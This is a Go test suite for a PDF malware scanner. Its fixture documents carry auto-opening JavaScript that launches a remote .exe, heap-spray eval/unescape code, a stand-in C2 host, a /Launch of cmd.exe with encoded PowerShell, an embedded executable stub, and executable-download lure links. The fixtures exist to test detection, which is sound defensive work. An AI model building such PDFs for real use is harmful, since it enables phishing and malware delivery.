package main

import (
	"bytes"
	"compress/zlib"
	"fmt"
	"strings"
	"testing"
)

// buildTestPDF assembles a minimal but structurally valid PDF from object bodies.
func buildTestPDF(objects [][]byte) []byte {
	var buf bytes.Buffer
	buf.WriteString("%PDF-1.7\n")
	offsets := make([]int, len(objects))
	for i, body := range objects {
		offsets[i] = buf.Len()
		fmt.Fprintf(&buf, "%d 0 obj\n", i+1)
		buf.Write(body)
		buf.WriteString("\nendobj\n")
	}
	xref := buf.Len()
	fmt.Fprintf(&buf, "xref\n0 %d\n0000000000 65535 f \n", len(objects)+1)
	for _, off := range offsets {
		fmt.Fprintf(&buf, "%010d 00000 n \n", off)
	}
	fmt.Fprintf(&buf, "trailer<</Size %d/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF\n", len(objects)+1, xref)
	return buf.Bytes()
}

func flateStreamObject(t *testing.T, payload []byte) []byte {
	t.Helper()
	var compressed bytes.Buffer
	w := zlib.NewWriter(&compressed)
	if _, err := w.Write(payload); err != nil {
		t.Fatalf("compress: %v", err)
	}
	w.Close()
	var obj bytes.Buffer
	fmt.Fprintf(&obj, "<</Length %d/Filter/FlateDecode>>\nstream\n", compressed.Len())
	obj.Write(compressed.Bytes())
	obj.WriteString("\nendstream")
	return obj.Bytes()
}

// scanPDFBytes runs the PDF analyzer over data and returns the result.
func scanPDFBytes(t *testing.T, data []byte) ScanResult {
	t.Helper()
	result := ScanResult{FileType: "PDF document"}
	cfg := Config{Mode: "standard", MinStringLen: 5, MaxDecodeDepth: 2}
	if err := analyzePDFDocument(&result, cfg, data, func(string, ...any) {}); err != nil {
		t.Fatalf("analyzePDFDocument: %v", err)
	}
	return result
}

// hasPDFFinding reports whether the scan produced a finding with the given
// title. It wraps the shared hasFindingTitle helper from expert.go.
func hasPDFFinding(result ScanResult, title string) bool {
	return hasFindingTitle(result.Findings, title)
}

func totalScore(result ScanResult) int {
	score := 0
	for _, f := range result.Findings {
		score += f.Score
	}
	return score
}

// TestPDFOpenActionJavaScript covers the core malicious shape: JavaScript that
// runs automatically when the document opens.
func TestPDFOpenActionJavaScript(t *testing.T) {
	pdf := buildTestPDF([][]byte{
		[]byte("<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>"),
		[]byte("<</Type/Pages/Kids[]/Count 0>>"),
		[]byte("<</Type/Action/S/JavaScript/JS(var u='http://185.220.101.44/stage2.exe';app.launchURL(u);)>>"),
	})
	result := scanPDFBytes(t, pdf)

	if result.PDF == nil {
		t.Fatal("PDF info was not recorded")
	}
	if !hasPDFFinding(result, "PDF executes JavaScript automatically on open") {
		t.Errorf("auto-executing JavaScript was not flagged; findings: %+v", result.Findings)
	}
	if len(result.PDF.JavaScript) == 0 {
		t.Error("no JavaScript body was recovered")
	}
}

// TestPDFHexEscapedNames verifies the #xx evasion is decoded and reported.
// /J#61vaScript is /JavaScript; a scanner that only greps raw bytes misses it.
func TestPDFHexEscapedNames(t *testing.T) {
	pdf := buildTestPDF([][]byte{
		[]byte("<</Type/Catalog/Pages 2 0 R/Open#41ction 3 0 R>>"),
		[]byte("<</Type/Pages/Kids[]/Count 0>>"),
		[]byte("<</Type/Action/S/J#61vaScript/J#53(eval(unescape('%u9090'));)>>"),
	})
	result := scanPDFBytes(t, pdf)

	if !hasPDFFinding(result, "PDF uses hex-escaped names to hide structure") {
		t.Errorf("hex-escaped names were not flagged; findings: %+v", result.Findings)
	}
	if !hasPDFFinding(result, "PDF executes JavaScript automatically on open") {
		t.Error("obfuscated /OpenAction + /JavaScript was not resolved to the auto-exec finding")
	}
	if len(result.PDF.ObfuscatedNames) == 0 {
		t.Error("no obfuscated names were recorded")
	}
}

// TestPDFJavaScriptInsideFlateStream is the case that separates a real analyzer
// from a keyword grep: the payload only exists after decompression.
func TestPDFJavaScriptInsideFlateStream(t *testing.T) {
	hidden := []byte("<</Type/Action/S/JavaScript/JS(eval(unescape('%u9090%u9090'));var c='http://evil-c2.tk/a';)>>")
	pdf := buildTestPDF([][]byte{
		[]byte("<</Type/Catalog/Pages 2 0 R/OpenAction 4 0 R>>"),
		[]byte("<</Type/Pages/Kids[]/Count 0>>"),
		flateStreamObject(t, hidden),
		[]byte("<</Type/Action/S/JavaScript/JS 3 0 R>>"),
	})

	// The payload must be invisible in the raw bytes, or the test proves nothing.
	if bytes.Contains(pdf, []byte("evil-c2.tk")) {
		t.Fatal("test fixture is not actually compressed")
	}

	result := scanPDFBytes(t, pdf)
	if result.PDF.StreamsDecompressed == 0 {
		t.Fatal("no stream was decompressed")
	}
	if !hasPDFFinding(result, "PDF JavaScript uses obfuscation or exploit primitives") {
		t.Errorf("obfuscation primitives inside the compressed stream were missed; findings: %+v", result.Findings)
	}
	// The C2 URL must reach the IOC set from inside the compressed stream.
	found := false
	for _, u := range result.IOCs.URLs {
		if strings.Contains(u, "evil-c2.tk") {
			found = true
		}
	}
	if !found {
		t.Errorf("C2 URL from the compressed stream did not reach the IOC set: %+v", result.IOCs.URLs)
	}
}

// TestPDFLaunchAction covers /Launch, and pins that the program it runs is
// reported as a launch target rather than as an embedded attachment.
func TestPDFLaunchAction(t *testing.T) {
	pdf := buildTestPDF([][]byte{
		[]byte("<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>"),
		[]byte("<</Type/Pages/Kids[]/Count 0>>"),
		[]byte("<</Type/Action/S/Launch/Win<</F(cmd.exe)/P(/c powershell -enc ZQBjAGgAbwA=)>>>>"),
	})
	result := scanPDFBytes(t, pdf)

	if !hasPDFFinding(result, "PDF launches an external program") {
		t.Errorf("/Launch was not flagged; findings: %+v", result.Findings)
	}
	if len(result.PDF.LaunchTargets) == 0 {
		t.Error("launch target was not recovered")
	}
	if len(result.PDF.EmbeddedFiles) != 0 {
		t.Errorf("launch target was misreported as an embedded attachment: %v", result.PDF.EmbeddedFiles)
	}
	if hasPDFFinding(result, "PDF carries an executable payload") {
		t.Error("a /Launch target must not raise the embedded-payload finding")
	}
}

// TestPDFEmbeddedExecutable covers the "invoice.exe attachment" phishing shape,
// including identification of the payload by its magic bytes.
func TestPDFEmbeddedExecutable(t *testing.T) {
	pe := append([]byte("MZ\x90\x00"), bytes.Repeat([]byte("A"), 256)...)
	pdf := buildTestPDF([][]byte{
		[]byte("<</Type/Catalog/Pages 2 0 R/Names<</EmbeddedFiles 3 0 R>>>>"),
		[]byte("<</Type/Pages/Kids[]/Count 0>>"),
		[]byte("<</Names[(invoice.exe) 4 0 R]>>"),
		[]byte("<</Type/Filespec/F(invoice.exe)/EF<</F 5 0 R>>>>"),
		flateStreamObject(t, pe),
	})
	result := scanPDFBytes(t, pdf)

	if !hasPDFFinding(result, "PDF carries an executable payload") {
		t.Errorf("embedded executable was not flagged; findings: %+v", result.Findings)
	}
	if len(result.PDF.EmbeddedPayloads) == 0 {
		t.Error("embedded payload type was not identified from magic bytes")
	}
}

// TestPDFBenignDocumentStaysQuiet is the false-positive guard. An ordinary
// document with a link and a form must not accumulate score — links, /AcroForm
// and encryption are normal and are recorded without being scored.
func TestPDFBenignDocumentStaysQuiet(t *testing.T) {
	content := []byte("BT /F1 12 Tf 72 720 Td (Quarterly report. See https://www.example.com/docs.) Tj ET")
	pdf := buildTestPDF([][]byte{
		[]byte("<</Type/Catalog/Pages 2 0 R/AcroForm<</Fields[]>>>>"),
		[]byte("<</Type/Pages/Kids[3 0 R]/Count 1>>"),
		[]byte("<</Type/Page/Parent 2 0 R/Contents 4 0 R/Annots[5 0 R]>>"),
		flateStreamObject(t, content),
		[]byte("<</Type/Annot/Subtype/Link/A<</S/URI/URI(https://www.example.com/docs)>>>>"),
	})
	result := scanPDFBytes(t, pdf)

	if score := totalScore(result); score > 0 {
		t.Errorf("benign document scored %d, want 0; findings: %+v", score, result.Findings)
	}
}

// TestPDFMalformedInputIsSafe pins that hostile or truncated documents produce
// no panic and no hang — the analyzer runs on attacker-controlled input.
func TestPDFMalformedInputIsSafe(t *testing.T) {
	cases := map[string][]byte{
		"header only":         []byte("%PDF-"),
		"truncated":           []byte("%PDF-1.7\n1 0 obj\n<</Type"),
		"unterminated stream": []byte("%PDF-1.7\n1 0 obj\n<</Length 999>>\nstream\n" + strings.Repeat("A", 500)),
		"bad flate":           []byte("%PDF-1.7\nstream\n\x78\x9c\xff\xff\xff\xff\nendstream\n"),
		"nul bytes":           append([]byte("%PDF-1.7\n"), bytes.Repeat([]byte{0}, 1024)...),
		"many hash escapes":   []byte("%PDF-1.7\n" + strings.Repeat("/A#41", 5000)),
		"empty stream pairs":  []byte("%PDF-1.7\n" + strings.Repeat("stream\nendstream\n", 2000)),
	}
	for name, data := range cases {
		t.Run(name, func(t *testing.T) {
			// A panic here fails the test rather than taking down the process.
			_ = scanPDFBytes(t, data)
		})
	}
}

// TestPDFBinaryStreamDoesNotFakeStructure is the regression guard for the
// worst false-positive class found on real documents: a compressed font or
// image is high-entropy binary in which short names like /AA and /JS occur by
// chance. Counting keywords there reported JavaScript in system PDFs that
// contain none — 30 of 40 ordinary PDFs scored "Suspicious".
func TestPDFBinaryStreamDoesNotFakeStructure(t *testing.T) {
	// A binary blob that happens to contain the short structural names.
	blob := []byte{0x00, 0xff, 0x80, 0x13}
	blob = append(blob, []byte("/AA")...)
	blob = append(blob, 0xca, 0x05, 0x9e)
	blob = append(blob, []byte("/JS")...)
	blob = append(blob, 0xde, 0xad, 0xbe, 0xef)
	blob = append(blob, []byte("/5#ca")...)
	blob = append(blob, bytes.Repeat([]byte{0xf1, 0x0c, 0x77, 0xa2}, 200)...)

	pdf := buildTestPDF([][]byte{
		[]byte("<</Type/Catalog/Pages 2 0 R>>"),
		[]byte("<</Type/Pages/Kids[]/Count 0>>"),
		flateStreamObject(t, blob),
	})
	result := scanPDFBytes(t, pdf)

	if score := totalScore(result); score > 0 {
		t.Errorf("binary stream content produced score %d, want 0; findings: %+v", score, result.Findings)
	}
	if len(result.PDF.ObfuscatedNames) != 0 {
		t.Errorf("random bytes reported as obfuscated names: %v", result.PDF.ObfuscatedNames)
	}
	for _, hit := range result.PDF.Keywords {
		if hit.Keyword == "/JS" || hit.Keyword == "/AA" {
			t.Errorf("structural keyword %q counted inside binary stream data", hit.Keyword)
		}
	}
}

// TestPDFLegitimateHexEscapesIgnored pins that ordinary escaped resource names
// are not treated as evasion — real PDFs escape spaces in font names.
func TestPDFLegitimateHexEscapesIgnored(t *testing.T) {
	pdf := buildTestPDF([][]byte{
		[]byte("<</Type/Catalog/Pages 2 0 R>>"),
		[]byte("<</Type/Pages/Kids[3 0 R]/Count 1>>"),
		[]byte("<</Type/Page/Resources<</Font<</F1 <</BaseFont/Arial#20Bold#20MT>> >> >> >>"),
	})
	result := scanPDFBytes(t, pdf)

	if len(result.PDF.ObfuscatedNames) != 0 {
		t.Errorf("benign escaped font name flagged as evasion: %v", result.PDF.ObfuscatedNames)
	}
	if hasPDFFinding(result, "PDF uses hex-escaped names to hide structure") {
		t.Error("benign escaped resource name raised the obfuscation finding")
	}
}

// TestPDFCountKeywordBoundaries pins the name-delimiter rule that keeps the
// two-character /AA from matching inside longer names.
func TestPDFCountKeywordBoundaries(t *testing.T) {
	cases := []struct {
		text, keyword string
		want          int
	}{
		{"<</AA 3 0 R>>", "/AA", 1},
		{"<</AAPL 3 0 R>>", "/AA", 0},
		{"<</JS(x)>>", "/JS", 1},
		{"<</JSName 1>>", "/JS", 0},
		{"/OpenAction /OpenAction", "/OpenAction", 2},
		{"/OpenActionExtra", "/OpenAction", 0},
	}
	for _, tc := range cases {
		if got := pdfCountKeyword(tc.text, tc.keyword); got != tc.want {
			t.Errorf("pdfCountKeyword(%q, %q) = %d, want %d", tc.text, tc.keyword, got, tc.want)
		}
	}
}

// TestPDFStripStreamData pins that structure survives and payload bytes do not.
func TestPDFStripStreamData(t *testing.T) {
	doc := []byte("<</Type/Catalog>>\nstream\nSECRETPAYLOAD/JS\nendstream\n<</Type/Page>>")
	stripped := string(pdfStripStreamData(doc))

	if strings.Contains(stripped, "SECRETPAYLOAD") {
		t.Errorf("stream payload survived stripping: %q", stripped)
	}
	for _, want := range []string{"/Type/Catalog", "/Type/Page"} {
		if !strings.Contains(stripped, want) {
			t.Errorf("structure %q was lost during stripping: %q", want, stripped)
		}
	}
}

// TestPDFStripStreamDataKeepsStructureBetweenStreams is the regression guard
// for a resync bug: "endstream" itself contains "stream", so resuming the scan
// at the terminator made the next iteration match inside it and discard every
// object up to the following stream. On a real phishing PDF that removed all
// the link annotations, leaving the keyword scan with nothing to find.
func TestPDFStripStreamDataKeepsStructureBetweenStreams(t *testing.T) {
	doc := []byte("<</Type/Catalog>>\n" +
		"stream\nPAYLOAD_ONE\nendstream\n" +
		"<</Type/Annot/Subtype/Link/A<</S/URI/URI(https://evil.example/a.exe)>>>>\n" +
		"stream\nPAYLOAD_TWO\nendstream\n" +
		"<</Type/Page>>")
	stripped := string(pdfStripStreamData(doc))

	for _, unwanted := range []string{"PAYLOAD_ONE", "PAYLOAD_TWO"} {
		if strings.Contains(stripped, unwanted) {
			t.Errorf("stream payload %q survived stripping: %q", unwanted, stripped)
		}
	}
	// The annotation sits between two streams — exactly what the bug ate.
	if !strings.Contains(stripped, "/URI") {
		t.Errorf("structure between two streams was discarded: %q", stripped)
	}
	if got := pdfCountKeyword(stripped, "/URI"); got != 2 {
		t.Errorf("pdfCountKeyword(/URI) = %d, want 2 (in %q)", got, stripped)
	}
}

// TestPDFExecutableLinkLure covers the pure lure document: no JavaScript, no
// /OpenAction, no attachment — just a link to a payload. A scanner that looks
// only for active content scores this shape as clean.
func TestPDFExecutableLinkLure(t *testing.T) {
	pdf := buildTestPDF([][]byte{
		[]byte("<</Type/Catalog/Pages 2 0 R>>"),
		[]byte("<</Type/Pages/Kids[3 0 R]/Count 1>>"),
		[]byte("<</Type/Page/Parent 2 0 R/Annots[4 0 R 5 0 R]>>"),
		[]byte("<</Type/Annot/Subtype/Link/A<</S/URI/URI(https://cdn.example.com/invoice/uninstall.exe)>>>>"),
		[]byte("<</Type/Annot/Subtype/Link/A<</S/URI/URI(https://cdn.example.com/list.7z)>>>>"),
	})
	result := scanPDFBytes(t, pdf)

	if !hasPDFFinding(result, "PDF links directly to an executable download") {
		t.Errorf("executable link was not flagged; findings: %+v", result.Findings)
	}
	if !hasPDFFinding(result, "PDF links to an archive download") {
		t.Errorf("archive link was not flagged; findings: %+v", result.Findings)
	}
	if len(result.PDF.ExecutableLinks) != 1 {
		t.Errorf("ExecutableLinks = %v, want exactly the .exe", result.PDF.ExecutableLinks)
	}
}

// TestPDFLinkExtensionUsesPathNotHost is the false-positive guard for link
// classification. Several payload extensions are also TLDs — ".com" above all,
// and ".zip" since it became a real TLD — so matching the whole URL classified
// every link to "www.baidu.com" as an executable download.
func TestPDFLinkExtensionUsesPathNotHost(t *testing.T) {
	benign := []string{
		"http://www.baidu.com",
		"https://www.baidu.com/",
		"https://example.com",
		"https://research.zip",
		"https://example.com/page?file=report.exe.html",
		"https://example.com/docs/manual.pdf",
	}
	if got := pdfLinksWithExtension(benign, pdfDirectExecutableExtensions); len(got) != 0 {
		t.Errorf("benign links classified as executable downloads: %v", got)
	}
	if got := pdfLinksWithExtension(benign, pdfArchiveLinkExtensions); len(got) != 0 {
		t.Errorf("benign links classified as archive downloads: %v", got)
	}

	payloads := []string{
		"https://cdn.example.com/setup.exe",
		"https://cdn.example.com/a/b/installer.msi?id=7",
		// Percent-encoded non-ASCII names are the norm for localized lures.
		"https://cdn.example.com/%E5%90%8D%E5%8D%95.7z",
	}
	exe := pdfLinksWithExtension(payloads, pdfDirectExecutableExtensions)
	if len(exe) != 2 {
		t.Errorf("executable links = %v, want the .exe and .msi", exe)
	}
	arc := pdfLinksWithExtension(payloads, pdfArchiveLinkExtensions)
	if len(arc) != 1 {
		t.Errorf("archive links = %v, want the percent-encoded .7z", arc)
	}
}

// TestPDFEntropyIsNotScored guards the format-level calibration: a PDF is built
// from deflate streams, so high entropy is the expected shape and must not be
// scored as packing.
func TestPDFEntropyIsNotScored(t *testing.T) {
	if !isKnownCompressedFormat("PDF document") {
		t.Error("PDF must be treated as a natively compressed format for entropy scoring")
	}
}

// TestPDFDecodeHexEscapes covers the normalization helper directly.
func TestPDFDecodeHexEscapes(t *testing.T) {
	cases := []struct{ in, want string }{
		{"/J#61vaScript", "/JavaScript"},
		{"/Open#41ction", "/OpenAction"},
		{"/Normal", "/Normal"},
		{"/Bad#ZZ", "/Bad#ZZ"},
		{"#48#65#6C#6C#6F", "Hello"},
	}
	for _, tc := range cases {
		if got := string(pdfDecodeHexEscapes([]byte(tc.in))); got != tc.want {
			t.Errorf("pdfDecodeHexEscapes(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}
